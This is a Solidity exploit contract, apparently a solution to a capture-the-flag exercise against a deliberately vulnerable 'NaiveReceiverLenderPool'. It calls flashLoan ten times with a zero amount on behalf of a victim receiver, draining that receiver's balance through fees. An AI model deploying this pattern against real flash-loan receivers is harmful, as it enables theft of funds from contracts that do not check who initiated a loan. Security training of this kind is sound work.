// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";


contract Attack{
        address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    function attack(IERC3156FlashBorrower receiver, NaiveReceiverLenderPool pool)external{
        for(uint256 i=0; i<10; i++){

            pool.flashLoan( receiver, ETH, 0,"");
            
        }
        
    }
}
